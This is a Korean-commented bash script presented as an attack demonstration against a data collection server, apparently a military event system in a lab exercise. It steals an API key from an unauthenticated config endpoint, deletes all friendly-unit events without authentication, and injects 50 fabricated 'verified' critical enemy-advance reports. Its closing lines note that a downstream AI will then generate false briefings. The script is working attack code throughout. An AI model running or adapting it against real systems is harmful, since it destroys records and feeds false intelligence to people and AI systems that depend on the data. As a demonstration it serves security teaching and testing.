#!/bin/bash
# ============================================================
# C14 공격 데모 스크립트 — 허위 적군 이벤트 50건 대량 주입
#
# 이 스크립트는 STEP 5-2 공격 절차를 시연한다.
# 실행: bash attack_demo.sh [TARGET_URL]
# ============================================================

set -e

TARGET="${1:-http://192.168.130.12:8000}"

echo "============================================================"
echo "C14 데이터 수집 서버 공격 데모"
echo "대상: $TARGET"
echo "============================================================"

# ──────────────────────────────────────────────
# 단계 1: API 키 획득 (VULN-C14-01)
# ──────────────────────────────────────────────
echo ""
echo "[1/5] /api/config에서 API 키 획득 중..."
CONFIG=$(curl -s "$TARGET/api/config")
echo "$CONFIG" | python3 -m json.tool 2>/dev/null || echo "$CONFIG"

API_KEY=$(echo "$CONFIG" | python3 -c "import sys,json; print(json.load(sys.stdin)['api_key'])" 2>/dev/null || echo "dev-key-12345")
echo "  -> 획득한 API 키: $API_KEY"

# ──────────────────────────────────────────────
# 단계 2: 현재 이벤트 현황 파악
# ──────────────────────────────────────────────
echo ""
echo "[2/5] 현재 이벤트 통계 조회..."
curl -s -H "X-API-Key: $API_KEY" "$TARGET/api/stats" | python3 -m json.tool 2>/dev/null

# ──────────────────────────────────────────────
# 단계 3: 아군 이벤트 전량 삭제 (VULN-C14-02: 인증 없음)
# ──────────────────────────────────────────────
echo ""
echo "[3/5] 아군 이벤트 전량 삭제 (인증 없이)..."
echo "  - friendly_move 삭제:"
curl -s -X DELETE "$TARGET/api/events?type=friendly_move"
echo ""
echo "  - friendly_patrol 삭제:"
curl -s -X DELETE "$TARGET/api/events?type=friendly_patrol"
echo ""
echo "  - friendly_resupply 삭제:"
curl -s -X DELETE "$TARGET/api/events?type=friendly_resupply"
echo ""

# ──────────────────────────────────────────────
# 단계 4: 허위 적군 전진 이벤트 대량 주입 (VULN-C14-03 + VULN-C14-04)
# ──────────────────────────────────────────────
echo ""
echo "[4/5] 허위 enemy_advance 이벤트 50건 주입 중..."
for i in $(seq 1 50); do
    LAT=$(echo "37.7 + ($i * 0.01)" | bc)
    LNG=$(echo "126.7 + ($RANDOM % 100) * 0.01" | bc)

    curl -s -X POST "$TARGET/api/events" \
        -H "X-API-Key: $API_KEY" \
        -H "Content-Type: application/json" \
        -d "{
            \"type\": \"enemy_advance\",
            \"unit\": \"적 제${i}기계화보병대대\",
            \"location\": {\"lat\": $LAT, \"lng\": $LNG},
            \"priority\": \"critical\",
            \"source\": \"sensor\",
            \"verified\": true,
            \"description\": \"적 기계화부대 대규모 남하 전진 감지 — 구간 $i\"
        }" > /dev/null

    if [ $((i % 10)) -eq 0 ]; then
        echo "  ... $i/50건 주입 완료"
    fi
done
echo "  -> 50건 주입 완료"

# ──────────────────────────────────────────────
# 단계 5: 변조 후 통계 확인
# ──────────────────────────────────────────────
echo ""
echo "[5/5] 변조 후 이벤트 통계 조회..."
curl -s -H "X-API-Key: $API_KEY" "$TARGET/api/stats" | python3 -m json.tool 2>/dev/null

echo ""
echo "============================================================"
echo "공격 데모 완료"
echo "  - 아군 이벤트: 전량 삭제됨"
echo "  - 허위 적군 이벤트: 50건 주입됨"
echo "  - C15 AI가 15분 내 허위 브리핑 생성 예정"
echo "============================================================"
